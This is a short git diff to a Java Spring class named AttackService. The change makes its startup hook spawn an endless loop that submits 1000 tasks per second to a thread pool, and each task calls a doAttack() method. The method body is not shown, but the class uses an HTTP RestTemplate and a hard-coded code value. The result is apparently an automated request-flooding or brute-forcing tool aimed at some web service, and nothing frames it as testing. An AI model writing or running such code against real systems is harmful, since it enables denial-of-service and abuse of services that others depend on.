@@ -1,5 +1,8 @@
 package com.test.service;
 
+import java.util.concurrent.ExecutorService;
+import java.util.concurrent.Executors;
+import java.util.concurrent.TimeUnit;
 import lombok.extern.slf4j.Slf4j;
 import org.apache.commons.lang3.RandomStringUtils;
 import org.springframework.beans.factory.InitializingBean;
@@ -23,16 +26,35 @@ public class AttackService implements InitializingBean {
 
     @Autowired
     private RestTemplate restTemplate;
+    private ExecutorService executor = Executors.newFixedThreadPool(20);
 
     private volatile String code = "2PHATU";
 
     @Override
     public void afterPropertiesSet() throws Exception {
-        attack();
+        new Thread(() -> {
+            attack();
+        }).start();
     }
 
     public void attack() {
-        doAttack();
+        while (true) {
+            for (int i = 0; i < 1000; i++) {
+                executor.execute(() -> {
+                    try {
+                        doAttack();
+                    } catch (Exception e) {
+                        log.error("", e);
+                    }
+                });
+            }
+            try {
+                TimeUnit.SECONDS.sleep(1);
+            } catch (InterruptedException e) {
+                e.printStackTrace();
+            }
+        }
+
     }
 
     public void doAttack() {
